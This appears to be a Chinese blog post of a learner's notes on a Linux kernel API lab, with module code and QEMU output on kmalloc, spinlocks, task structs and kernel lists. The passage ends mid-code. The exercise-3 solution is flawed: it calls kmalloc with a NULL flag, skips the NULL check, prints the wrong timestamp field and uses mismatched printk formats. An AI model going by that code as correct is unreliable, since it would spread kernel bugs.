<li>运行代码作为系统调用的结果时</li>
<li>在内核线程的上下文中运行时</li>
</ul>
</li>
<li>中断上下文：<ul>
<li>在例程中运行以处理中断时</li>
<li>可延迟操作时</li>
</ul>
</li>
</ul>
<p>某些内核 API 调用可能会阻止当前进程（例如使用信号量或等待条件变量），在这种情况下，进程将进入等待队列，并且让另一个进程运行</p>
<p><strong>Locking</strong></p>
<p>内核编程最重要的特性之一是并行性，Linux 支持具有多个处理器和内核抢占性的 SMP 系统</p>
<p>这使得内核编程更加困难，因为对全局变量的访问必须与自旋锁基元  spinlock primitives 或阻塞基元 blocking primitives 同步：</p>
<ul>
<li>在受自旋锁保护的关键区域中运行的代码，不允许挂起当前进程</li>
<li>当进程开始自旋时，其占用的 CPU 资源也不会释放</li>
<li>因此，尽可能少使用自旋锁</li>
</ul>
<p><strong>Preemptivity</strong></p>
<p>Linux 使用抢占式内核</p>
<p>抢占式多任务处理的概念是指：操作系统在其量程（时间片）到期时，强制中断在用户空间中运行的进程，以便运行另一个进程</p>
<ul>
<li>由于抢占性，当我们需要从不同进程上下文中运行的两部分代码之间共享资源时，我们需要使用 synchronization primitives 同步基元来保护自己，即使在单个处理器的情况下也是如此</li>
</ul>
<p><strong>Convention indicating errors</strong></p>
<p>对于 Linux 内核编程，用于调用函数以指示成功的约定与在 UNIX 编程中相同：</p>
<ul>
<li>0 表示成功，或 0 以外的值表示失败（返回负值）</li>
</ul>
<p>详尽的错误列表和摘要解释可以在 <code>include/asm-generic/errno-base.h</code> 和 <code>includes/asm-generic/ernno.h</code></p>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=kernel_api make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  kernel_api git:(master) ✗ ls</span><br><span class="line">1-mem  2-sched-spin  3-memory  4-list  5-list-full  6-list-sync  7-list-test</span><br></pre></td></tr></table></figure>
<p>1.Memory allocation in Linux kernel：</p>
<ul>
<li>观察调用 <code>kmalloc()</code> 对内存的分配情况</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * mem.c - Memory allocation in Linux</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Print memory&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> *mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> i;</span><br><span class="line"></span><br><span class="line">	mem = kmalloc(<span class="number">4096</span> * <span class="keyword">sizeof</span>(*mem), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (mem == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_mem;</span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;chars: &quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4096</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">isalpha</span>(mem[i]))</span><br><span class="line">			printk(KERN_CONT <span class="string">&quot;%c &quot;</span>, mem[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	pr_info(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_mem:</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mem_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	kfree(mem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(mem_init);</span><br><span class="line">module_exit(mem_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果如下：（<code>printk</code> 默认换行，可以使用 KERN_CONT 禁止换行）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mem: loading out-of-tree <span class="keyword">module</span> taints kernel.                                  </span><br><span class="line">chars: Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z  </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br><span class="line">Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z Z </span><br></pre></td></tr></table></figure>
<p>2.Sleeping in atomic context：</p>
<ul>
<li>熟悉自旋锁的使用：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * sched-spin.c: Sleeping in atomic context</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Sleep while atomic&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">sched_spin_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">spinlock_t</span> lock;</span><br><span class="line"></span><br><span class="line">	spin_lock_init(&amp;lock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 0: Use spin_lock to aquire the lock */</span></span><br><span class="line">	spin_lock(&amp;lock);</span><br><span class="line">	set_current_state(TASK_INTERRUPTIBLE);</span><br><span class="line">	<span class="comment">/* Try to sleep for 5 seconds. */</span></span><br><span class="line">	schedule_timeout(<span class="number">5</span> * HZ);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 0: Use spin_unlock to release the lock */</span></span><br><span class="line">	spin_unlock(&amp;lock);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sched_spin_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(sched_spin_init);</span><br><span class="line">module_exit(sched_spin_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>加载内核模块时报出了 <code>scheduling while atomic</code> 这个错误，说是会污染内核（当内核受到污染意味着内核处于社区不支持的状态）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">2</span>-sched-spin<span class="meta"># insmod sched-spin.ko              </span></span><br><span class="line">sched_spin: loading out-of-tree <span class="keyword">module</span> taints kernel.                           </span><br><span class="line">BUG: scheduling <span class="keyword">while</span> atomic: insmod/<span class="number">239</span>/<span class="number">0x00000002</span>                             </span><br><span class="line"><span class="number">1</span> lock held by insmod/<span class="number">239</span>:                                                      </span><br><span class="line"> #<span class="number">0</span>: c585bdb8 (&amp;lock)&#123;+.+.&#125;-&#123;<span class="number">2</span>:<span class="number">2</span>&#125;, at: sched_spin_init+<span class="number">0x32</span>/<span class="number">0x90</span> [sched_spin]   </span><br><span class="line">Modules linked in: sched_spin(O+)                                               </span><br><span class="line">CPU: <span class="number">0</span> PID: <span class="number">239</span> Comm: insmod Tainted: G           O      <span class="number">5.10</span><span class="number">.14</span>+ #<span class="number">3</span>            </span><br><span class="line">Hardware name: <span class="function">QEMU Standard <span class="title">PC</span> <span class="params">(i440FX + PIIX, <span class="number">1996</span>)</span>, BIOS 1.13.0-1ubuntu1.1 04</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在错误消息中按照包含 BUG 的说明：不能在原子操作中 sleep（自旋锁是用原子操作实现的）</li>
</ul>
<p>3.Working with kernel memory：</p>
<ul>
<li>为结构体 <code>struct task_info</code> 分配内存并初始化其字段</li>
<li>为当前进程、父进程、下一进程、下一进程的下一进程分配结构体 <code>struct task_info</code></li>
<li>显示四个结构</li>
<li>释放结构占用的内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 lab3 - task 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Memory processing&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti1</span>, *<span class="title">ti2</span>, *<span class="title">ti3</span>, *<span class="title">ti4</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: allocated and initialize a task_info struct */</span></span><br><span class="line">	ti = (struct task_info*)kmalloc(<span class="keyword">sizeof</span>(struct task_info),<span class="literal">NULL</span>);</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memory_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="comment">/* TODO 2: call task_info_alloc for current pid */</span></span><br><span class="line">	p = current;</span><br><span class="line">	ti1 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="comment">/* TODO 2: call task_info_alloc for parent PID */</span></span><br><span class="line">	p = current-&gt;parent;</span><br><span class="line">	ti2 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="comment">/* TODO 2: call task_info alloc for next process PID */</span></span><br><span class="line">	p = next_task(p);</span><br><span class="line">	ti3 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="comment">/* TODO 2: call task_info_alloc for next process of the next process */</span></span><br><span class="line">	p = next_task(next_task(p));</span><br><span class="line">	ti4 = task_info_alloc(p-&gt;pid);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">memory_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* TODO 3: print ti* field values */</span></span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti1-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti2-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti3-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	printk(<span class="string">&quot;%d:%d&quot;</span>,ti4-&gt;pid,ti1-&gt;timestamp);</span><br><span class="line">	<span class="comment">/* TODO 4: free ti* structures */</span></span><br><span class="line">	kfree(ti1);</span><br><span class="line">	kfree(ti2);</span><br><span class="line">	kfree(ti3);</span><br><span class="line">	kfree(ti4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(memory_init);</span><br><span class="line">module_exit(memory_exit);</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">3</span>-memory<span class="meta"># insmod memory.ko                      </span></span><br><span class="line">memory: loading out-of-tree <span class="keyword">module</span> taints kernel.                               </span><br><span class="line">root@qemux86:~/skels/kernel_api/<span class="number">3</span>-memory<span class="meta"># rmmod memory.ko                       </span></span><br><span class="line"><span class="number">237</span>:<span class="number">-48258</span>                                                                      </span><br><span class="line"><span class="number">213</span>:<span class="number">-48258</span>                                                                      </span><br><span class="line"><span class="number">214</span>:<span class="number">-48258</span>         </span><br></pre></td></tr></table></figure>
<p>4.Working with kernel lists：</p>
<ul>
<li>熟悉 Linux 链表的使用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kernel API lab</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * list.c: Working with lists</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/list.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Use list to process task info&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> &#123;</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> timestamp;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">head</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct task_info *<span class="title">task_info_alloc</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	ti = kmalloc(<span class="keyword">sizeof</span>(*ti), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (ti == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	ti-&gt;pid = pid;</span><br><span class="line">	ti-&gt;timestamp = jiffies;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_to_list</span><span class="params">(<span class="keyword">int</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 1: Allocate task_info and add it to list */</span></span><br><span class="line">	ti = task_info_alloc(pid);</span><br><span class="line">	list_add(&amp;ti-&gt;<span class="built_in">list</span>,&amp;head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_add_for_current</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Add current, parent, next and next of next to the list */</span></span><br><span class="line">	task_info_add_to_list(current-&gt;pid);</span><br><span class="line">	task_info_add_to_list(current-&gt;parent-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(current)-&gt;pid);</span><br><span class="line">	task_info_add_to_list(next_task(next_task(current))-&gt;pid);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_print_list</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	pr_info(<span class="string">&quot;%s: [ &quot;</span>, msg);</span><br><span class="line">	list_for_each(p, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		pr_info(<span class="string">&quot;(%d, %lu) &quot;</span>, ti-&gt;pid, ti-&gt;timestamp);</span><br><span class="line">	&#125;</span><br><span class="line">	pr_info(<span class="string">&quot;]\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">task_info_purge_list</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">p</span>, *<span class="title">tmp</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_info</span> *<span class="title">ti</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: Iterate over the list and delete all elements */</span></span><br><span class="line">	list_for_each_safe(p, tmp, &amp;head) &#123;</span><br><span class="line">		ti = list_entry(p, struct task_info, <span class="built_in">list</span>);</span><br><span class="line">		list_del(p);</span><br><span class="line">		kfree(ti);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">list_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	INIT_LIST_HEAD(&amp;head);</span><br><span class="line">	task_info_add_for_current();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 